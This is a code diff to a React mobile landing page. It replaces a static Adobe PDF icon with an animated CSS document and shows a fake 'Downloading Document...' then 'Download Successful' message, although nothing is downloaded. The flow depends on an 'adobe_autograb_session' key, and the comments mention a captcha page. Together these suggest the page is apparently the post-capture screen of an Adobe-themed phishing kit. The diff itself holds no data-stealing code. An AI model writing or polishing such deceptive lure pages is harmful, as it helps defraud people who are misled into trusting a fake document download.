@@ -5,21 +5,22 @@ interface MobileLandingPageProps {
 }
 
 /**
- * MobileLandingPage simplified to only implement the download-sequence behavior:
- * - On mount, if adobe_autograb_session exists and the download overlay hasn't yet been shown
- *   for that session, show "Downloading Document...." with animated dots.
- * - After a short interval switch to "Download Successful" and keep it visible
- *   until the page is refreshed.
- *
- * NOTE: remove the persisted adobe_autograb_session from localStorage once the
- * sequence completes so that a full page refresh returns the user to the captcha page.
+ * Updated behavior per request:
+ * - Replace static Adobe icon background with a real (CSS) PDF document animation component.
+ * - Run one flow: "Downloading..." -> "Download Successful" -> then hide text,
+ *   leaving the PDF document visible plainly (no success text over it).
+ * - Text should be clearly visible without heavy high-contrast styling.
+ * - Keep session gating and removal of 'adobe_autograb_session' when complete.
  */
 const MobileLandingPage: React.FC<MobileLandingPageProps> = () => {
   const [showOverlay, setShowOverlay] = useState(false);
   const [phase, setPhase] = useState<'idle' | 'downloading' | 'success'>('idle');
   const [dots, setDots] = useState('');
+  const [docAnimating, setDocAnimating] = useState(false);
+
   const dotIntervalRef = useRef<number | null>(null);
   const successTimeoutRef = useRef<number | null>(null);
+  const hideOverlayTimeoutRef = useRef<number | null>(null);
 
   useEffect(() => {
     try {
@@ -41,6 +42,7 @@ const MobileLandingPage: React.FC<MobileLandingPageProps> = () => {
       // Start sequence
       setShowOverlay(true);
       setPhase('downloading');
+      setDocAnimating(true);
 
       let dotCount = 1;
       const maxDots = 6;
@@ -63,6 +65,15 @@ const MobileLandingPage: React.FC<MobileLandingPageProps> = () => {
         try {
           localStorage.removeItem('adobe_autograb_session');
         } catch {}
+
+        // Hide overlay text shortly after showing success, leaving the doc plain.
+        hideOverlayTimeoutRef.current = window.setTimeout(() => {
+          setShowOverlay(false);
+          setPhase('idle');
+          setDocAnimating(false);
+          hideOverlayTimeoutRef.current = null;
+        }, 1200) as unknown as number;
+
         successTimeoutRef.current = null;
       }, 3000) as unknown as number;
 
@@ -79,6 +90,10 @@ const MobileLandingPage: React.FC<MobileLandingPageProps> = () => {
         clearTimeout(successTimeoutRef.current);
         successTimeoutRef.current = null;
       }
+      if (hideOverlayTimeoutRef.current) {
+        clearTimeout(hideOverlayTimeoutRef.current);
+        hideOverlayTimeoutRef.current = null;
+      }
     };
   }, []);
 
@@ -86,19 +101,19 @@ const MobileLandingPage: React.FC<MobileLandingPageProps> = () => {
     <div
       style={{
         minHeight: '100vh',
-        background: `url('https://upload.wikimedia.org/wikipedia/commons/thumb/7/7d/Adobe_PDF.svg/640px-Adobe_PDF.svg.png') center center / contain no-repeat`,
+        background: '#f4f6f8',
         display: 'flex',
         alignItems: 'center',
         justifyContent: 'center',
-        color: '#fff'
+        color: '#111'
       }}
     >
-      <div style={{ textAlign: 'center', opacity: 1 }}>
-        {/* intentionally empty */}
-      </div>
+      {/* PDF Document Animation replacing previous static icon */}
+      <PDFDocumentMobile animating={docAnimating} />
 
       {showOverlay && (
         <div
+          role="status"
           style={{
             position: 'fixed',
             inset: 0,
@@ -111,16 +126,15 @@ const MobileLandingPage: React.FC<MobileLandingPageProps> = () => {
         >
           <div
             style={{
-              color: '#ffffff',
+              color: '#111',
               fontSize: 16,
               fontWeight: 600,
               textAlign: 'center',
-              padding: '12px 18px',
+              padding: '10px 14px',
               borderRadius: 10,
-              background: 'transparent',
-              // Make the text readable over varied backgrounds without changing the background image
-              textShadow: '0 2px 8px rgba(0,0,0,0.75)',
-              WebkitTextStroke: '0.5px rgba(0,0,0,0.65)'
+              background: 'rgba(255,255,255,0.94)',
+              border: '1px solid rgba(0,0,0,0.06)',
+              boxShadow: '0 4px 16px rgba(0,0,0,0.08)'
             }}
           >
             {phase === 'downloading' && <span>Downloading Document{dots}</span>}
@@ -131,5 +145,78 @@ const MobileLandingPage: React.FC<MobileLandingPageProps> = () => {
     </div>
   );
 };
+
+function PDFDocumentMobile({ animating }: { animating: boolean }) {
+  return (
+    <div style={{ position: 'relative' }}>
+      <style>
+        {`
+          @keyframes pdfFloatMobile {
+            0%   { transform: translateY(0px);   }
+            50%  { transform: translateY(-8px);  }
+            100% { transform: translateY(0px);   }
+          }
+          .pdf-doc-m {
+            position: relative;
+            width: 180px;
+            height: 225px;
+            border-radius: 12px;
+            background: #ffffff;
+            box-shadow: 0 8px 24px rgba(0,0,0,0.12);
+            transition: transform 300ms ease;
+          }
+          .pdf-doc-m.animating {
+            animation: pdfFloatMobile 3s ease-in-out infinite;
+          }
+          .pdf-fold-m {
+            position: absolute;
+            top: 0;
+            right: 0;
+            width: 0;
+            height: 0;
+            border-left: 26px solid transparent;
+            border-top: 26px solid #eceff3;
+            border-top-right-radius: 8px;
+          }
+          .pdf-badge-m {
+            position: absolute;
+            top: 10px;
+            left: 10px;
+            background: #e53935;
+            color: #fff;
+            font-weight: 700;
+            font-size: 11px;
+            padding: 3px 7px;
+            border-radius: 6px;
+            letter-spacing: 0.6px;
+          }
+          .pdf-lines-m span {
+            display: block;
+            height: 8px;
+            background: #e9eef3;
+            border-radius: 6px;
+            margin: 10px 14px;
+          }
+          .pdf-lines-m span:nth-child(1) { width: 78%; margin-top: 52px; }
+          .pdf-lines-m span:nth-child(2) { width: 62%; }
+          .pdf-lines-m span:nth-child(3) { width: 86%; }
+          .pdf-lines-m span:nth-child(4) { width: 70%; }
+          .pdf-lines-m span:nth-child(5) { width: 82%; }
+        `}
+      </style>
+      <div className={`pdf-doc-m ${animating ? 'animating' : ''}`}>
+        <div className="pdf-fold-m" />
+        <div className="pdf-badge-m">PDF</div>
+        <div className="pdf-lines-m">
+          <span />
+          <span />
+          <span />
+          <span />
+          <span />
+        </div>
+      </div>
+    </div>
+  );
+}
 
 export default MobileLandingPage;
